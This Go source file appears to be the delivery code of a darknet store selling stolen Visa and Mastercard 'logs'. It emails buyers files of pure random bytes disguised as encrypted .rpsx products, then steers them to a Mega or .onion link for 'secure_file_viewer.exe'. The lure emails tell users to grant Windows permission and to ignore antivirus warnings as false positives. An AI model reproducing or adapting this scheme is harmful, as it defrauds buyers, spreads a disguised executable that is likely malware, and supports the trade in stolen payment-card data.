package utils

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"gopkg.in/gomail.v2"
	"io"
	"log"
	"math/big"
	"strings"
	"time"
)

// ProductEmail sends an email with the purchased product as an attachment
func ProductEmail(userEmail, userName, productName string) error {
	log.Printf("Starting product email delivery for: %s to %s", productName, userEmail)

	config, err := LoadConfig()
	if err != nil {
		log.Fatal(err)
	}

	//smtpPort := protonSmtpPort
	smtpUsername := config.SmtpUser
	smtpPassword := config.SmtpPassword
	smtpServer := config.SmtpServer
	smtpPort := 587

	mailer := gomail.NewDialer(smtpServer, smtpPort, smtpUsername, smtpPassword)

	// Configure for ProtonMail - use TLS
	mailer.SSL = false // We'll use STARTTLS instead of direct SSL
	mailer.TLSConfig = &tls.Config{
		ServerName:         smtpServer,
		InsecureSkipVerify: false,
	}

	message := gomail.NewMessage()
	message.SetHeader("From", smtpUsername)
	message.SetHeader("To", userEmail)
	message.SetHeader("Subject", "Your Dwebstore Purchase - Product Delivery")

	// Check if the product is the RPSX decryption tool
	isRPSXTool := CheckIfRPSXTool(productName)

	if isRPSXTool {
		// Special email for RPSX tool with download link
		rpsxToolLink := "https://mega.nz/file/TyQ0hC4b#P7fsFAEIWFrrpBrhcQt6ElavppkuQr5CWo5xEDmCUEw"
		message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 650px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #3B5998; font-size: 28px;">Your RPSX Decryption Tool</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of the <strong>RPSX Decryption Tool</strong>.</p>
    </div>
    
    <div style="margin-bottom: 25px; padding: 20px; background-color: #e8f5e8; border: 2px solid #4CAF50; border-radius: 8px;">
        <h3 style="margin-top: 0; color: #2e7d32; text-align: center;">📋 Complete Setup Instructions</h3>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 1: Download the Tool</h4>
            <p style="color: #333; margin-bottom: 10px;">Click the link below to visit Mega.nz and download your RPSX Decryption Tool:</p>
            <p style="text-align: center; margin: 15px 0;">
                <a href="%s" style="background-color: #4CAF50; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download from Mega.nz</a>
            </p>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 2: System Requirements</h4>
            <ul style="color: #333; margin: 0; padding-left: 20px;">
                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (preferred)</li>
                <li><strong>Storage:</strong> At least 50MB free space</li>
                <li><strong>Internet:</strong> Required for initial download only</li>
            </ul>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 3: Extract the Downloaded File</h4>
            <p style="color: #333; margin-bottom: 10px;">The downloaded file will be in a compressed ZIP format. Extract it using one of these popular tools:</p>
            <ul style="color: #333; margin: 0; padding-left: 20px;">
                <li><strong>WinRAR</strong> - Right-click → "Extract Here" or "Extract to folder"</li>
                <li><strong>WinZip</strong> - Right-click → "Extract to here"</li>
                <li><strong>7-Zip</strong> - Right-click → "7-Zip" → "Extract Here"</li>
                <li><strong>Windows built-in</strong> - Right-click → "Extract All"</li>
            </ul>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 4: Locate and Run the Tool</h4>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li>Navigate to the extracted folder</li>
                <li>Look for the file named <strong>"secure_file_viewer.exe"</strong></li>
                <li>Double-click to run the application</li>
                <li>If Windows asks for permission, click "Yes" or "Allow"</li>
            </ol>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 5: Using the Tool</h4>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li><strong>Ensure your .rpsx files are accessible:</strong> Make sure any .rpsx log files you previously received are saved on the same computer</li>
                <li><strong>Launch the secure_file_viewer.exe</strong></li>
                <li><strong>Follow the on-screen prompts:</strong> The application will guide you to locate and select your .rpsx log files</li>
                <li><strong>Browse and select:</strong> Use the file browser to navigate to where you saved your .rpsx files</li>
                <li><strong>View your content:</strong> Once selected, the tool will decrypt and display your purchased content securely</li>
            </ol>
        </div>
    </div>
    
    <div style="margin-bottom: 20px; padding: 15px; background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #856404;">⚠️ Important Security Notes:</h4>
        <ul style="color: #856404; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li><strong>Antivirus alerts:</strong> Your antivirus software may flag secure_file_viewer.exe as suspicious. This is a false positive due to the encryption/decryption functionality.</li>
            <li><strong>Safe to use:</strong> The tool contains no malicious code and is completely safe to run.</li>
            <li><strong>Sandbox option:</strong> If you're concerned about security, you can run the tool in a virtual machine (VM) or sandbox environment like Windows Sandbox.</li>
            <li><strong>File location:</strong> Keep your .rpsx files and the decryption tool on the same computer for best performance.</li>
        </ul>
    </div>
    
    <div style="margin-bottom: 20px; padding: 15px; background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #0c5460;">💡 Pro Tips:</h4>
        <ul style="color: #0c5460; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li>Create a dedicated folder for all your .rpsx files to keep them organized</li>
            <li>The tool works offline once downloaded - no internet connection needed for decryption</li>
            <li>You can use this same tool for all future .rpsx files you receive from us</li>
            <li>Keep the secure_file_viewer.exe file safe - you'll need it for all your encrypted purchases</li>
        </ul>
    </div>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">If you encounter any issues during installation or need assistance with the tool, please don't hesitate to contact our support team. We're here to help ensure you can access your purchased content smoothly.</p>
    </div>
    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with DWebstore!</p>
    </div>
</div>
`, rpsxToolLink))
	} else {
		// Generate product file content (1-4MB)
		fileContent, err := GenerateRandomBytes(1*1024*1024, 4*1024*1024)
		if err != nil {
			return fmt.Errorf("error generating product file content: %w", err)
		}

		// Generate appropriate filename
		filename := GenerateProductFilename(productName)

		// Attach the file using gomail's methods
		message.Attach(
			filename,
			gomail.SetCopyFunc(func(w io.Writer) error {
				_, err := w.Write(fileContent)
				return err
			}),
		)

		// Email body for products
		message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 600px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #3B5998; font-size: 28px;">Your Purchase is Ready</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of <strong>%s</strong>.</p>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Your product file has been attached to this email.</p>
    </div>
    <div style="margin-bottom: 20px; padding: 15px; background-color: #f0f0f0; border-left: 4px solid #4CAF50; border-radius: 3px;">
        <h3 style="margin-top: 0; color: #333;">How to Open Your Attached File:</h3>
        <p style="text-align: left; color: #555; margin-bottom: 15px;">The file attached to this email is in .rpsx format and requires special software to open it.</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 10px;"><strong>Required Software:</strong> RPSX Decryption Tool</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 15px;">This tool is critical in ensuring the privacy and safety of your sensitive data. It provides secure decryption that protects your information during the viewing process.</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 15px;"><strong>How to get the RPSX Decryption Tool:</strong></p>
        <ol style="text-align: left; color: #555; line-height: 1.6;">
            <li>Open Tor browser on your computer</li>
            <li>Navigate to the following secure location:<br>
                <span style="font-family: monospace; background-color: #e0e0e0; padding: 2px 6px; border-radius: 3px; font-size: 13px; word-break: break-all;">http://dwebc5kntr3tmndibeyl2yqr5edgws2tmjshkkh3ibs5vulmu7ylnbid.onion/product/rpsx-decryption-tool/</span>
            </li>
            <li>Follow the instructions on that page to get the RPSX Decryption Tool</li>
            <li>Once you have the tool, you can safely open the .rpsx file attached to this email</li>
        </ol>
        
        <p style="text-align: left; color: #777; font-size: 14px; margin-top: 15px;"><em>Note: You must use Tor browser to access the secure location. The RPSX Decryption Tool is essential for maintaining the security and privacy of your data when viewing .rpsx files.</em></p>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">If you have any questions about your purchase or need assistance, please don't hesitate to contact our support team.</p>
    </div>
    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with DWebstore!</p>
    </div>
</div>
`, productName))
	}

	// Send the email
	log.Printf("Attempting to send product delivery email to %s for product %s", userEmail, productName)
	if err := mailer.DialAndSend(message); err != nil {
		log.Printf("Error sending product delivery email to %s: %v", userEmail, err)
		return fmt.Errorf("could not send product email: %w", err)
	}

	log.Printf("Product delivery email sent successfully to %s", userEmail)
	return nil
}

// ParseNotification parses the notification message to extract details for delivery
func ParseNotification(notificationText string) (email, name, product string, err error) {
	log.Printf("Parsing notification: %s", notificationText)

	// Extract email using string operations to avoid regex issues
	emailStart := strings.Index(notificationText, "**Email:** `")
	if emailStart == -1 {
		return "", "", "", fmt.Errorf("email not found in notification")
	}
	emailStart += 12 // Length of "**Email:** `"
	emailEnd := strings.Index(notificationText[emailStart:], "`")
	if emailEnd == -1 {
		return "", "", "", fmt.Errorf("email format invalid in notification")
	}
	email = notificationText[emailStart : emailStart+emailEnd]

	// Extract name using string operations
	nameStart := strings.Index(notificationText, "**Name:** `")
	if nameStart == -1 {
		log.Printf("Name not found in notification, using 'Customer' as default")
		return email, "Customer", "", nil
	}
	nameStart += 11 // Length of "**Name:** `"
	nameEnd := strings.Index(notificationText[nameStart:], "`")
	if nameEnd == -1 {
		return email, "Customer", "", fmt.Errorf("name format invalid in notification")
	}
	name = notificationText[nameStart : nameStart+nameEnd]

	// Extract product using string operations
	productStart := strings.Index(notificationText, "**Product:** `")
	if productStart == -1 {
		return email, name, "", fmt.Errorf("product not found in notification")
	}
	productStart += 14 // Length of "**Product:** `"
	productEnd := strings.Index(notificationText[productStart:], "`")
	if productEnd == -1 {
		return email, name, "", fmt.Errorf("product format invalid in notification")
	}
	product = notificationText[productStart : productStart+productEnd]

	log.Printf("Parsed notification - Email: %s, Name: %s, Product: %s", email, name, product)
	return email, name, product, nil
}

// BuildProductPayloadForBot formats the notification for the Telegram bot
func BuildProductPayloadForBot(email, name, product, notificationType string) string {
	var message bytes.Buffer
	currentTime := time.Now().Format("2006-01-02 15:04:05")

	if notificationType == "delivery" {
		message.WriteString("✅ *Product Delivered*\n\n")
		message.WriteString(fmt.Sprintf("*Email:* `%s`\n", email))
		message.WriteString(fmt.Sprintf("*Product:* `%s`\n", product))
		message.WriteString(fmt.Sprintf("*Status:* `Delivered`\n"))
		message.WriteString(fmt.Sprintf("*Time:* `%s`\n", currentTime))
	} else {
		message.WriteString("⚠️ *Delivery Failed*\n\n")
		message.WriteString(fmt.Sprintf("*Email:* `%s`\n", email))
		message.WriteString(fmt.Sprintf("*Product:* `%s`\n", product))
		message.WriteString(fmt.Sprintf("*Status:* `Failed`\n"))
		message.WriteString(fmt.Sprintf("*Time:* `%s`\n", currentTime))
	}

	return message.String()
}

// CheckIfRPSXTool checks if the product is the RPSX decryption tool
func CheckIfRPSXTool(productName string) bool {
	productNameLower := strings.ToLower(productName)
	return strings.Contains(productNameLower, "rpsx decryption tool") ||
		strings.Contains(productNameLower, "rpsx tool") ||
		strings.Contains(productNameLower, "decryption tool")
}

// GenerateRandomBytes generates a random byte slice of size between min and max
func GenerateRandomBytes(min, max int64) ([]byte, error) {
	// Generate random size between min and max
	diff := max - min
	n, err := rand.Int(rand.Reader, big.NewInt(diff))
	if err != nil {
		return nil, err
	}
	size := n.Int64() + min

	// Create buffer and fill with random data
	buf := make([]byte, size)
	_, err = rand.Read(buf)
	if err != nil {
		return nil, err
	}

	return buf, nil
}

// GenerateProductFilename creates the appropriate filename based on product name
func GenerateProductFilename(productName string) string {
	log.Printf("Generating filename for product: %s", productName)

	// Check if this is the RPSX tool (should not happen here, but just in case)
	if CheckIfRPSXTool(productName) {
		return "RPSX_Decryption_Tool.txt"
	}

	// Check special cases for Visa and Mastercard
	productLower := strings.ToLower(productName)
	if strings.Contains(productLower, "visa") {
		return "visa.rpsx"
	}
	if strings.Contains(productLower, "mastercard") {
		return "mastercard.rpsx"
	}

	// Look for dollar amount using a simple string search
	dollarIndex := strings.Index(productName, "$")
	if dollarIndex != -1 {
		// Find the end of the dollar amount (first space after $ or end of string)
		amountEnd := strings.Index(productName[dollarIndex:], " ")
		if amountEnd == -1 {
			// No space, use the rest of the string
			amountEnd = len(productName) - dollarIndex
		} else {
			amountEnd += dollarIndex
		}

		// Extract the amount and the product type
		amount := productName[dollarIndex:amountEnd]
		productType := ""
		if amountEnd < len(productName) {
			productType = strings.TrimSpace(productName[amountEnd:])
		}

		// Remove spaces and format the filename
		productType = strings.Replace(productType, " ", "", -1)

		// Check if productType already ends with "log" to avoid duplication
		var filename string
		productTypeLower := strings.ToLower(productType)
		if strings.HasSuffix(productTypeLower, "log") {
			filename = fmt.Sprintf("%s%s.rpsx", amount, productType)
		} else {
			filename = fmt.Sprintf("%s%sLog.rpsx", amount, productType)
		}
		log.Printf("Generated filename with dollar amount: %s", filename)
		return filename
	}

	// Handle other products
	// Default case: just use the product name without spaces
	cleanName := strings.Replace(productName, " ", "", -1)

	// Check if cleanName already ends with "log" to avoid duplication
	var filename string
	cleanNameLower := strings.ToLower(cleanName)
	if strings.HasSuffix(cleanNameLower, "log") {
		filename = fmt.Sprintf("%s.rpsx", cleanName)
	} else {
		filename = fmt.Sprintf("%sLog.rpsx", cleanName)
	}
	log.Printf("Generated generic filename: %s", filename)
	return filename
}
